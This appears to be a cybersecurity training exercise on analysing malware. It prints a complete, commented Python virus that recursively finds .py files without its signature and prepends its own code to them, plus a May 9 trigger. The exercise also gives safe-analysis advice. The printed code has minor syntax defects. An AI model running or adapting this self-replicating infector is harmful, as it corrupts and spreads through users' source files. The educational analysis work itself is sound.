### Perform an analysis of the Python-based code.

Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

```python
#!/usr/bin/python3 # This tells the computer to use python3 to run the script
import os # This imports the os module
import datetime # This imports the datetime module

SIGNATURE = "VIRUS" # This sets the variable SIGNATURE to VIRUS

# The def locate(path): function is used to locate the path of the file
def locate(path): # This defines the function locate
    files_targeted = [] # This sets the variable files_targeted to an empty list
    filelist = os.listdir(path) *# his sets the variable filelist to the list of files in the path
    for fname in filelist: # This starts a for loop that will iterate through the list of files
        if os.path.isdir(path+"/"+fname): # This checks if the file is a directory
            files_targeted.extend(locate(path+"/"+fname)) # This extends the list of files_targeted with the list of files in the directory
        elif fname[-3:] == ".py": # This checks if the file is a python file
            infected = False # This sets the variable infected to False
            for line in open(path+"/"+fname): # This starts a for loop that will iterate through the lines in the file
                if SIGNATURE in line: # This checks if the line contains the signature
                    infected = True # This sets the variable infected to True
                    break # This breaks the for loop
            if infected == False: # This checks if the variable infected is False
                files_targeted.append(path+"/"+fname) # This appends the file to the list of files_targeted
    return files_targeted # This returns the list of files_targeted

# The def infect(files_targeted): function is used to infect the files in the list of files_targeted
def infect(files_targeted): # This defines the function infect
    virus = open(os.path.abspath(__file__)) # This opens the file
    virusstring = "" # This sets the variable virusstring to an empty string
    for i,line in enumerate(virus): # This starts a for loop that will iterate through the lines in the file
        if 0 <= i < 39: # This checks if the line is between 0 and 39
            virusstring += line # This adds the line to the virusstring
    virus.close # This closes the file
    for fname in files_targeted: # This starts a for loop that will iterate through the list of files
        f = open(fname) # This opens the file
        temp = f.read() # This sets the variable temp to the contents of the file
        f.close() # This closes the file
        f = open(fname,"w") # This opens the file in write mode
        f.write(virusstring + temp) # This writes the virusstring and the contents of the file to the file
        f.close() # This closes the file

# The def detonate(): function is used to detonate the virus
def detonate(): # This defines the function detonate
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # This checks if the date is May 9th
        print("You have been hacked") # This prints the message

# The final three lines of code are used to call the functions.  This is what actually tells the computer to activate the code
files_targeted = locate(os.path.abspath("")) # This sets the variable files_targeted to the list of files in the current directory
infect(files_targeted) # This calls the function infect with the list of files as the argument
detonate() # This calls the function detonate
```

# Ops Challenge - Python Malware Analysis

## Demo Code

Analyzing malware code can be a potentially risky task, as it involves handling potentially harmful code that can infect systems. However, if you follow proper precautions and use a safe environment, you can minimize the risks.

The demo code below introduces concepts necessary to complete the challenge.


```python
#!/usr/bin/env python3

def changeme( mylist ):
   mylist.append([1,2,3,4]);
   print("Values inside the function: ", mylist)
   return

mylist = [10,20,30];
changeme( mylist );
print("Values outside the function: ", mylist)

```

Break the code into pieces. Identify each component. Use what you know. For example, you know functions must be declared before they can be called.

```python
#!/usr/bin/env python3

# Function definition is here

def changeme( mylist ):
# This changes a passed list into this function

   mylist.append([1,2,3,4]);
   print("Values inside the function: ", mylist)
   return

# The function changeme has been declared. Now you can call changeme function.

# First, the script declares a variable called "mylist" as [10,20,30]
mylist = [10,20,30];

# The function changeme is called with the parameter "mylist" inserted.
changeme( mylist );

# Prints a string then the contents of "mylist" variable
print("Values outside the function: ", mylist)
```

By translating the code line by line and using the concepts we know, we can gradually interpret the meaning of code written by another person.


## Notes

Here are some recommended steps to analyze malware code safely:

1. Isolate the Environment
    - Create a controlled and isolated environment to analyze the malware. Use a dedicated VM or an offline system that is not connected to your network or critical infrastructure. This prevents the malware from spreading or causing damage beyond the isolated environment.
2. Analyze Indicators of Compromise (IOCs)
    - Identify any potential indicators of compromise, such as file names, registry entries, or network connections associated with the malware. Analyze these IOCs to understand the impact and potential mitigation strategies.
3. Use a Debugger
    - A debugger is a useful tool that allows you to pause the execution of the code in order to inspect it's behavior. However, exercise caution when using these tools, as some malware may be designed to detect and evade analysis.
4. Analyze in a Controlled Network
    - If network behavior analysis is required, connect the virtual machine to an isolated network environment, such as a separate subnet or virtual network. Monitor the network traffic and interactions of the malware within this controlled environment.
